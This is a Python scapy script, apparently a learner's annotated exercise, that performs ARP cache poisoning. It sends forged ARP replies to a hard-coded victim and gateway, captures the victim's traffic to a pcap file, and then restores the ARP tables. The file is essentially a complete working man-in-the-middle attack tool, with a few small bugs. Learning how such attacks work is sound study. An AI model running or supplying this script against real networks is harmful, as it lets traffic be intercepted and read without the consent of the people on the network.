# from FILENAME import *CLASS*
from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr,
                       send,sniff,sndrcv, srp,wrpcap)
import os,sys,time

'''For my sanity/understanding
import ast
res = ast.literal_eval("b%s" % test)
import bz2
len(bz2.decompress(res))
'''
def get_mac(targetip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op="who-has", pdst=targetip) #Packet[brdcst [ARP request for MAC] ]

    # next a scapy method is used called srp (Maybe it means Scapy Resolution Protocol !?)
    # srp is a scapy function that sends and receives packets on Layer 2
    # srp function returns a) a list of packets sent & received and
    #                      b) I do not know  yet what this is (will look at scapy videos).
    resp, x = srp(packet, timeout=2, retry=10, verbose=False)
    print("1)",type(resp),resp)
    print("2) Before loop:", type(x), x)
    for x, r in resp:
        print("3) In loop:", type(x), x)
        print("4)", type(r), r)
        print("5)",r[Ether].src)
        return r[Ether].src
    return None

class MrArper:
    def __init__(self, victim, gateway,inteface='eth0'):  # Page 60
        self.victim = victim
        self.victimmac = get_mac(victim)
        self.gateway = gateway
        self.gatewaymac = get_mac(gateway)
        self.interface = interface
        conf.iface = interface            # the conf must belong to some library
        conf.verb = 0
        print('-' * 30)
        print("In MrArper Class")
        print(f'Initialized interface {interface}:')
        print(f'Gateway ({gateway}) is at {self.gatewaymac}.')
        print(f'Victim ({victim}) is at {self.victimmac}.')
        print('-' * 30)

    def run(self):
        # Task 1 poison the ARP cache
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()

        # Task 2 watch the attack in progress by sniffing the network traffic
        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

    def poison(self):
        # 1) Setting-up/initializing details of victim. Will run/send packets later, in step 3.
        # poison_victim is my variable but it takes on the FUNCTION ARP()
        poison_victim = ARP()
        poison_victim.op = 2  # Question. ( the other op we saw was op='who-is')
        # I determine the SOURCE IP of the packet, as the gateway !! - Sneaky
        poison_victim.psrc = self.gateway   # why preceded by 'p' in pdst and psrc ??
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac
        print(f'ip src: {poison_victim.psrc} (ie the gateway - not my machine!')
        print(f'ip dst: {poison_victim.pdst}')
        print(f'mac dst: {poison_victim.hwdst}')
        print(f'mac src: {poison_victim.hwsrc}')  # Question: shouldn't this be set - it was not set yet.
        print(poison_victim.summary())
        print('-' * 30)
        # 2) Setting-up/initializing details of gateway. Will run/send packets later, in step 3.
        poison_gateway = ARP()
        poison_gateway.op = 2 # Question. ( the other op we saw was op='who-is')
        # I determine the SOURCE of the packet, as the victim/target !! - Sneaky
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac
        print(f'ip src: {poison_gateway.psrc}')
        print(f'ip dst: {poison_gateway.pdst}')
        print(f'mac dst: {poison_gateway.hwdst}')
        print(f'mac_src: {poison_gateway.hwsrc}')
        print(poison_gateway.summary())
        print('-' * 30)

        # 3)
        print(f'Beginning the ARP poison (ie sending the packets).Ffor 45 seconds.')
        t_end = time.time() + 45  # 45 seconds
        while time.time() < t_end:
        #while True: # keep running the poison all the while we need to eavesdrop - until KeyboardInterrupt of ^C
            sys.stdout.write(str(time.strftime("%H:%M:%S"))+"~")
            sys.stdout.flush()
            #try:
            send(poison_victim)
            send(poison_gateway)
            # 4)
            # except KeyboardInterrupt:
            #     self.restore()
            #     sys.exit()
            #     print('Performed "sys.exit()"')
            #else:
            time.sleep(2)
        self.restore()
        #sys.exit()
        #print('Performed "sys.exit()"')

    def sniff(self,count=100):
        '''sniffs for a 100 packets by default'''
        #1)give the poisoning thread time to start working
        time.sleep(5)
        print(f'Sniffing {count} packets')
        #2)only packets that have the victim’s IP
        BPFilter = "ip host %s" % victim
        #3)get a whole lot of packets
        packets = sniff(count=count, filter=BPFilter, iface=self.interface)
        #4)write these packets to a pcap file called MrArperYP.pcap
        wrpcap('MrArperYP.pcap', packets)
        print('Got the packets (in pcap file (called MrArperYP.pcap')
        #5)put everything back as before and end the poison threads
        self.restore()
        self.poison_thread.terminate()
        print('Finished.')

    def restore(self):
        print('Restoring ARP tables...')
        #1) send to the victim the original values for the gateway IP and MAC
        send(ARP(pdst=self.victim,
            op=2,
            psrc=self.gateway,
            hwsrc=self.gatewaymac,
            hwdst='ff:ff:ff:ff:ff:ff'),
            count=5)
        #2) send to the gateway the original values for the victim’s IP and MAC
        send(ARP( pdst=self.gateway,
            op=2,
            psrc=self.victim,
            hwsrc=self.victimmac,
            hwdst='ff:ff:ff:ff:ff:ff'),
            count=5)

if __name__=='__main__':
    (victim, gateway, interface) = '192.168.8.103', '192.168.8.1', 'eth0'
    #(victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    MAC = get_mac(victim)
    myarp = MrArper(victim, gateway, interface)
    myarp.run()